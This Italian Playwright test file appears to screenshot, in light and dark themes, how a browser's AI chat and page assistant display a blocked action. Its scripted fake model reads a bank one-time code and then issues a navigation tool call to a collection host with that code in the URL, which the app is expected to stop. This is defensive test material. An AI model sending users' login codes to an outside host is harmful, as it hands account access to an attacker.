// Esplorazione del giro 6: aspetto della riga di blocco in chat e nell'assistente di pagina, chiaro e scuro.

import { test, expect } from '../../fixtures/electron.mjs';
import { CODICE, RACCOLTA, preparaModelli, modelloFinto, apriAiuto, scriviAllAiuto, newtab, NAVIGA_COL_CODICE, esitoUscita } from './aiuti.mjs';

for (const theme of ['light', 'dark']) {
  test(`aspetto chat ${theme}`, async ({ app, shell }) => {
    test.setTimeout(90_000);
    await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
    const page = await newtab(app);
    await preparaModelli(app);
    await app.evaluate(async (_e, theme) => {
      const M = globalThis.SN_FILO_MEMORY;
      await M.setOnboarding(globalThis.SN_ONBOARDING.close(await M.getOnboarding()));
      await globalThis.SN_STORAGE.updateSettings({ theme });
    }, theme);
    await page.reload();
    await expect(page.locator('#input')).toBeVisible();
    await modelloFinto(app, {
      giri: [
        { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
        { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
        { text: 'Non ho aperto la pagina: conteneva il codice.' },
      ],
    });
    await page.locator('#input').fill('leggi la notifica della banca e completa l’accesso');
    await page.locator('#sendBtn').click();
    await expect(page.locator('.dash-bubble-filo', { hasText: 'Non ho aperto la pagina' })).toBeVisible({ timeout: 20_000 });
    await page.waitForTimeout(500);
    await page.screenshot({ path: `tests/.shots/810-g6-chat-${theme}.png` });
    const head = page.locator('.dash-activity-head, .dash-activity-label').first();
    if (await head.count()) { await head.click().catch(() => {}); await page.waitForTimeout(400); }
    await page.screenshot({ path: `tests/.shots/810-g6-chat-${theme}-aperto.png` });
  });

  test(`aspetto aiuto ${theme}`, async ({ app, shell, openTab, testServer }) => {
    test.setTimeout(60_000);
    await app.evaluate(async (_e, theme) => { await globalThis.SN_STORAGE.updateSettings({ theme }); }, theme);
    const page = await testServer.openReady(openTab, `<!doctype html><html><head><title>Banca</title></head>
      <body><p>Il tuo codice monouso è ${CODICE}.</p></body></html>`);
    await preparaModelli(app);
    await modelloFinto(app, { aiuto: [['NON è partita', JSON.stringify({ text: 'Non l’ho aperta: conteneva il codice.', status: 'done' })], ['', NAVIGA_COL_CODICE]] });
    await apriAiuto(shell, page);
    await scriviAllAiuto(page, 'aiutami a finire l’accesso');
    expect(await esitoUscita(app, page)).toBe('fermato');
    await expect(page.locator('.sn-sidebar', { hasText: 'Non l’ho aperta' })).toBeVisible({ timeout: 20_000 });
    await page.waitForTimeout(500);
    await page.screenshot({ path: `tests/.shots/810-g6-aiuto-${theme}.png` });
  });
}
